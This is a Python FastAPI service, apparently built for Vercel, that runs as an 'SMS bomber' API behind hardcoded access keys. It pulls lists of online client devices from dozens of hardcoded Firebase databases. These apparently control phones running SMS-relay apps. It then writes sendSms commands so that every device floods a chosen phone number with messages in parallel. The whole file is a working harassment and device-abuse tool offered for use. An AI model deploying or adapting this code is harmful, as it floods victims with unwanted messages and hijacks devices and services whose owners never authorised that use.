#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║   🔥 @BRONX_ULTRA BOMBER API v7.1                       ║
║   ▸ API Key Protected (6 keys)                          ║
║   ▸ TRUE Full Fan-Out (ALL devices × count parallel)    ║
║   ▸ /stop endpoint                                      ║
║   ▸ Flash Speed 🚄                                      ║
║   ▸ Vercel Ready                                        ║
╚══════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import os
from datetime import datetime
from uuid import uuid4
from collections import defaultdict

import aiohttp
from fastapi import FastAPI, Request, BackgroundTasks, Query, Header
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware

# ═══════════════════════════════════════════════════════════
# 🔑 API KEYS — Only these 6 work
# ═══════════════════════════════════════════════════════════
VALID_KEYS = {
    "bronx-op",
    "prime-key",
    "flash-key",
    "bronx-vip",
    "bronx-pro",
    "bronx-max",
}

# ═══════════════════════════════════════════════════════════
# 🔥 FIREBASE URLs
# ═══════════════════════════════════════════════════════════
FIREBASE_URLS = [
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
    "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
    "https://rambhai-2c356-default-rtdb.firebaseio.com",
    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://tirgon-e0e0e-default-rtdb.firebaseio.com",
    "https://surajptiyanka-default-rtdb.firebaseio.com",
    "https://rtoch-8b5ed-default-rtdb.firebaseio.com",
    "https://online-a2823-default-rtdb.firebaseio.com",
    "https://awakenn88-default-rtdb.firebaseio.com",
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
    "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
    "https://rambhai-2c356-default-rtdb.firebaseio.com",
    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://tirgon-e0e0e-default-rtdb.firebaseio.com",
    "https://surajptiyanka-default-rtdb.firebaseio.com",
    "https://rtoch-8b5ed-default-rtdb.firebaseio.com",
    "https://online-a2823-default-rtdb.firebaseio.com",
    "https://awakenn88-default-rtdb.firebaseio.com",
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
    "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
    "https://rambhai-2c356-default-rtdb.firebaseio.com",
    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://tirgon-e0e0e-default-rtdb.firebaseio.com",
    "https://surajptiyanka-default-rtdb.firebaseio.com",
    "https://rtoch-8b5ed-default-rtdb.firebaseio.com",
    "https://online-a2823-default-rtdb.firebaseio.com",
    "https://awakenn88-default-rtdb.firebaseio.com",
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
    "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
    "https://rambhai-2c356-default-rtdb.firebaseio.com",
    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://tirgon-e0e0e-default-rtdb.firebaseio.com",
    "https://surajptiyanka-default-rtdb.firebaseio.com",
    "https://rtoch-8b5ed-default-rtdb.firebaseio.com",
    "https://online-a2823-default-rtdb.firebaseio.com",
    "https://awakenn88-default-rtdb.firebaseio.com",
    
]

SEND_ENDPOINTS = [
    "clients/{id}/webhookEvent/sendSms.json",
    "clients/{id}/webhookEvent/sendSmsRequest.json",
    "clients/{id}/webhookEvent/sms.json",
    "clients/{id}/sendSms.json",
    "sendSms/{id}.json",
]

# ═══════════════════════════════════════════════════════════
# ⚙️ SPEED SETTINGS — TUNED FOR FULL FAN-OUT
# ═══════════════════════════════════════════════════════════
MAX_CONCURRENT = 2000      # ⬆️ 150 → 2000 (massive parallel)
BATCH_CHUNK = 2000         # ⬆️ 500 → 2000 (bigger batches)
REQUEST_TIMEOUT = 8
CONNECT_TIMEOUT = 3

API_NAME = "@BRONX_ULTRA"
API_VERSION = "7.1"

# ═══════════════════════════════════════════════════════════
# 🚀 APP
# ═══════════════════════════════════════════════════════════
app = FastAPI(
    title=f"🔥 {API_NAME} BOMBER API",
    version=API_VERSION,
    description="Ultra Firebase Bomber — Key Protected | Full Fan-Out"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ═══════════════════════════════════════════════════════════
# 🔴 REDIS (OPTIONAL)
# ═══════════════════════════════════════════════════════════
redis = None
try:
    REDIS_URL = os.getenv("UPSTASH_REDIS_REST_URL")
    REDIS_TOKEN = os.getenv("UPSTASH_REDIS_REST_TOKEN")
    if REDIS_URL and REDIS_TOKEN:
        from upstash_redis.asyncio import Redis
        redis = Redis(url=REDIS_URL, token=REDIS_TOKEN)
        print("✅ Redis connected")
    else:
        print("⚠️ Redis not configured — /stop per-instance only")
except Exception as e:
    print(f"⚠️ Redis init skipped: {e}")
    redis = None

_LOCAL_STOP = set()

# ═══════════════════════════════════════════════════════════
# 🔑 KEY VERIFICATION
# ═══════════════════════════════════════════════════════════
def verify_key(api_key: str) -> bool:
    """Check if API key is valid"""
    if not api_key:
        return False
    return api_key.strip() in VALID_KEYS


def extract_key(request: Request, query_params: dict, body_data: dict) -> str:
    """Extract key from multiple places"""
    # 1. Header: X-API-Key
    key = request.headers.get("x-api-key") or request.headers.get("X-API-Key")
    if key:
        return key
    # 2. Authorization: Bearer xxx
    auth = request.headers.get("authorization", "")
    if auth.lower().startswith("bearer "):
        return auth[7:].strip()
    # 3. Query param: ?key=xxx or ?api_key=xxx
    key = query_params.get("key") or query_params.get("api_key")
    if key:
        return key
    # 4. Body: {"key": "xxx"}
    key = body_data.get("key") or body_data.get("api_key")
    if key:
        return key
    return ""


# ═══════════════════════════════════════════════════════════
# 🛠️ HELPERS
# ═══════════════════════════════════════════════════════════
def clean_url(url: str) -> str:
    url = url.rstrip("/")
    if url.endswith(".json"):
        url = url[:-5]
    return url.rstrip("/")


# ═══════════════════════════════════════════════════════════
# 📡 FETCH DEVICES — ALL FIREBASES IN PARALLEL
# ═══════════════════════════════════════════════════════════
async def fetch_devices_from(session, url):
    base = clean_url(url)
    try:
        async with session.get(f"{base}/clients.json") as r:
            if r.status != 200:
                return []
            data = await r.json(content_type=None)
            if not isinstance(data, dict):
                return []
            return [
                {"id": k, "url": base}
                for k, v in data.items()
                if isinstance(v, dict) and v.get("status") is True
            ]
    except Exception:
        return []


async def get_all_devices(session):
    """Fetch devices from ALL firebases simultaneously"""
    results = await asyncio.gather(
        *[fetch_devices_from(session, u) for u in FIREBASE_URLS],
        return_exceptions=True,
    )
    out = []
    for r in results:
        if isinstance(r, list):
            out.extend(r)
    return out


# ═══════════════════════════════════════════════════════════
# 💣 SEND ONE — Fast single fire
# ═══════════════════════════════════════════════════════════
async def send_one(session, device, target, message, sem, stats):
    async with sem:
        payload = {
            "from": 1,
            "to": target,
            "message": message,
            "isSended": False,
            "timestamp": int(time.time() * 1000),
        }
        for ep in SEND_ENDPOINTS:
            url = f"{device['url']}/{ep.format(id=device['id'])}"
            try:
                async with session.put(url, json=payload) as r:
                    if r.status in (200, 201):
                        stats["success"] += 1
                        return True
                    if r.status == 403:
                        stats["blocked"] += 1
                        return False
            except Exception:
                continue
        stats["failed"] += 1
        return False


async def is_stopped(number: str) -> bool:
    if number in _LOCAL_STOP:
        return True
    if redis:
        try:
            val = await redis.get(f"stop:{number}")
            return val is not None
        except Exception:
            return False
    return False


# ═══════════════════════════════════════════════════════════
# 💣 FULL FAN-OUT WORKER — EVERY DEVICE FIRES SIMULTANEOUSLY
# ═══════════════════════════════════════════════════════════
async def bomb_worker(number: str, message: str, count: int, api_key: str):
    jid = str(uuid4())[:8]
    t0 = time.time()

    if redis:
        try:
            await redis.delete(f"stop:{number}")
        except Exception:
            pass
    _LOCAL_STOP.discard(number)

    # 🔥 UNLIMITED CONNECTIONS — full parallel
    connector = aiohttp.TCPConnector(
        limit=0,                # 0 = unlimited total
        limit_per_host=0,       # 0 = unlimited per host
        ttl_dns_cache=300,
        force_close=False,
        enable_cleanup_closed=True,
    )
    timeout = aiohttp.ClientTimeout(
        total=REQUEST_TIMEOUT,
        connect=CONNECT_TIMEOUT,
    )
    headers = {
        "User-Agent": f"{API_NAME}/v{API_VERSION}",
        "Content-Type": "application/json",
    }

    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout, headers=headers
    ) as session:
        # 📡 Get ALL devices from ALL firebases in parallel
        devices = await get_all_devices(session)
        if not devices:
            print(f"[{jid}] ❌ No devices online")
            return

        ndev = len(devices)
        total = ndev * count

        print(f"\n{'='*55}")
        print(f"[{jid}] 🔥 {API_NAME} FULL FAN-OUT STARTED")
        print(f"[{jid}] Key        : {api_key}")
        print(f"[{jid}] Target     : {number}")
        print(f"[{jid}] Message    : {message[:40]}")
        print(f"[{jid}] Devices    : {ndev}")
        print(f"[{jid}] Per-device : {count}")
        print(f"[{jid}] TOTAL SMS  : {total}")
        print(f"{'='*55}")

        sem = asyncio.Semaphore(MAX_CONCURRENT)
        stats = {"success": 0, "failed": 0, "blocked": 0}

        # ✅ BUILD ALL TASKS — every device × every count (TRUE FAN-OUT)
        all_tasks = []
        for device in devices:
            for _ in range(count):
                all_tasks.append(
                    send_one(session, device, number, message, sem, stats)
                )

        total_tasks = len(all_tasks)
        print(f"[{jid}] 🚀 Firing {total_tasks} parallel requests "
              f"(sem={MAX_CONCURRENT})...")

        # ✅ FIRE IN BIG BATCHES — all within batch run in parallel
        completed = 0
        cancelled = False
        for i in range(0, total_tasks, BATCH_CHUNK):
            # 🛑 STOP CHECK before each batch
            if await is_stopped(number):
                print(f"[{jid}] 🛑 STOPPED at {completed}/{total_tasks}")
                cancelled = True
                for t in all_tasks[i:]:
                    t.cancel()
                break

            chunk = all_tasks[i:i + BATCH_CHUNK]
            await asyncio.gather(*chunk, return_exceptions=True)
            completed += len(chunk)

            elapsed_sf = time.time() - t0
            print(f"[{jid}] ⚡ {completed}/{total_tasks} | "
                  f"OK={stats['success']} | BLK={stats['blocked']} | "
                  f"{elapsed_sf:.1f}s")

        elapsed = round(time.time() - t0, 2)
        speed = round(stats["success"] / elapsed, 1) if elapsed else 0

        print(f"\n[{jid}] {'🛑 STOPPED' if cancelled else '✅ DONE'}")
        print(f"[{jid}] Sent={stats['success']} | Failed={stats['failed']} | "
              f"Blocked={stats['blocked']}")
        print(f"[{jid}] Time={elapsed}s | Speed={speed}/s 🚄")
        print(f"{'='*55}\n")


# ═══════════════════════════════════════════════════════════
# 🌐 ROUTES
# ═══════════════════════════════════════════════════════════
@app.get("/")
async def root():
    return {
        "api": API_NAME,
        "version": API_VERSION,
        "status": "🔥 ONLINE",
        "protected": True,
        "firebases_loaded": len(FIREBASE_URLS),
        "redis": "connected" if redis else "off",
        "mode": "FULL FAN-OUT — all devices × count simultaneously",
        "how_to_use": {
            "send": "/send?key=YOUR_KEY&message=Hi&number=9876543210&count=5",
            "stop": "/stop?key=YOUR_KEY&number=9876543210",
            "devices": "/devices?key=YOUR_KEY",
        },
        "header_alternative": "X-API-Key: YOUR_KEY",
    }


@app.get("/health")
async def health():
    return {
        "api": API_NAME,
        "status": "ok",
        "time": datetime.now().isoformat(),
    }


@app.get("/keys")
async def keys_info():
    """Show masked keys (for user awareness)"""
    return {
        "api": API_NAME,
        "total_keys": len(VALID_KEYS),
        "hint": "Contact admin for a valid key",
        "key_format_examples": ["bronx-xxxx", "prime-xxxx", "flash-xxxx"],
    }


# ═══════════════════════════════════════════════════════════
# 🚀 /send — KEY PROTECTED
# ═══════════════════════════════════════════════════════════
@app.api_route("/send", methods=["GET", "POST"])
async def send_endpoint(request: Request, bg: BackgroundTasks):
    # Parse params
    if request.method == "GET":
        query_data = dict(request.query_params)
        body_data = {}
    else:
        query_data = dict(request.query_params)
        try:
            body_data = await request.json()
        except Exception:
            try:
                body_data = dict(await request.form())
            except Exception:
                body_data = {}

    merged = {**query_data, **body_data}

    # 🔑 KEY CHECK
    api_key = extract_key(request, query_data, body_data)
    if not api_key:
        return JSONResponse(
            {
                "success": False,
                "api": API_NAME,
                "error": "🔑 API key required",
                "how_to": "Add ?key=YOUR_KEY or header X-API-Key",
            },
            status_code=401,
        )

    if not verify_key(api_key):
        return JSONResponse(
            {
                "success": False,
                "api": API_NAME,
                "error": "❌ Invalid API key",
                "your_key": api_key[:8] + "***" if len(api_key) > 8 else "***",
                "hint": "Contact admin for valid key",
            },
            status_code=401,
        )

    # Params
    message = merged.get("message") or merged.get("msg")
    number = merged.get("number") or merged.get("num") or merged.get("numer")
    count_str = merged.get("count", "1")

    if not message:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Missing message"}, 400
        )
    if not number:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Missing number"}, 400
        )

    number = str(number).strip().replace("+", "").replace(" ", "").replace("-", "")
    if not number.isdigit() or len(number) < 10:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Invalid number"}, 400
        )

    try:
        count = int(count_str)
        if count <= 0:
            raise ValueError
    except Exception:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "invalid count"}, 400
        )

    # 🚀 Launch background job
    bg.add_task(bomb_worker, number, message, count, api_key)

    return {
        "success": True,
        "api": API_NAME,
        "version": API_VERSION,
        "job_started": True,
        "key_used": api_key,
        "target": number,
        "per_device": count,
        "mode": "FULL FAN-OUT",
        "note": "Total SMS = (online devices) × count — ALL in parallel",
        "stop_url": f"/stop?key={api_key}&number={number}",
        "warning": "⚡ All devices firing simultaneously in background",
    }


# ═══════════════════════════════════════════════════════════
# 🛑 /stop — KEY PROTECTED
# ═══════════════════════════════════════════════════════════
@app.get("/stop")
async def stop_endpoint(
    request: Request,
    number: str = Query(None),
    key: str = Query(None),
):
    # Key from query or header
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse(
            {
                "success": False,
                "api": API_NAME,
                "error": "🔑 Valid API key required to stop",
            },
            status_code=401,
        )

    if not number:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "number required"}, 400
        )

    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
    _LOCAL_STOP.add(number)
    if redis:
        try:
            await redis.set(f"stop:{number}", "1", ex=300)
        except Exception:
            pass

    return {
        "success": True,
        "api": API_NAME,
        "message": f"🛑 Stop signal sent for {number}",
        "number": number,
        "key_used": api_key,
    }


# ═══════════════════════════════════════════════════════════
# 📱 /devices — KEY PROTECTED
# ═══════════════════════════════════════════════════════════
@app.get("/devices")
async def devices_endpoint(request: Request, key: str = Query(None)):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "🔑 Valid key required"},
            status_code=401,
        )

    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    timeout = aiohttp.ClientTimeout(total=15, connect=5)
    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout
    ) as session:
        devices = await get_all_devices(session)

    fb_group = defaultdict(int)
    for d in devices:
        fb_group[d["url"]] += 1

    return {
        "success": True,
        "api": API_NAME,
        "total_online": len(devices),
        "live_firebases": len(fb_group),
        "total_firebases": len(FIREBASE_URLS),
        "per_firebase": dict(fb_group),
        "devices": devices,
    }


# ═══════════════════════════════════════════════════════════
# 🌐 /firebases — PUBLIC (info only)
# ═══════════════════════════════════════════════════════════
@app.get("/firebases")
async def firebases_endpoint():
    return {
        "api": API_NAME,
        "success": True,
        "total": len(FIREBASE_URLS),
        "firebases": FIREBASE_URLS,
    }


# Vercel handler
handler = app
